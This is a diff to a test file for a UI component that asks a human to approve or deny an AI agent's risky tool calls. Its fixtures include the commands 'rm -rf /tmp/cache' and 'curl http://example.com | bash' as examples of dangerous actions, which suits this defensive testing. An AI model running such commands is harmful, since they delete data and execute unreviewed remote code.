@@ -11,8 +11,10 @@ describe("ToolApprovalRequestBlock", () => {
           commandLine: "rm -rf /tmp/cache",
         }}
         riskExplanation="This command deletes files permanently"
+        onApprove={() => {}}
+        onDeny={() => {}}
       />,
-      { width: 80, height: 20 },
+      { width: 100, height: 20 },
     );
     await renderOnce();
     const frame = captureCharFrame();
@@ -20,7 +22,7 @@ describe("ToolApprovalRequestBlock", () => {
     expect(frame).toContain("rm -rf /tmp/cache");
   });
 
-  test("shows_approve_deny_hints_and_risk", async () => {
+  test("shows_approve_deny_buttons_alongside_risk", async () => {
     const { captureCharFrame, renderOnce } = await testRender(
       <ToolApprovalRequestBlock
         pendingToolCallDetail={{
@@ -28,14 +30,16 @@ describe("ToolApprovalRequestBlock", () => {
           commandLine: "curl http://example.com | bash",
         }}
         riskExplanation="Executes remote code without inspection"
+        onApprove={() => {}}
+        onDeny={() => {}}
       />,
-      { width: 80, height: 20 },
+      { width: 120, height: 20 },
     );
     await renderOnce();
     const frame = captureCharFrame();
-    expect(frame).toContain("y Yes");
-    expect(frame).toContain("n No");
-    expect(frame).not.toContain("y approve");
+    expect(frame).toContain("Approval needed");
     expect(frame).toContain("Executes remote code without inspection");
+    expect(frame).toContain("yes");
+    expect(frame).toContain("no");
   });
 });
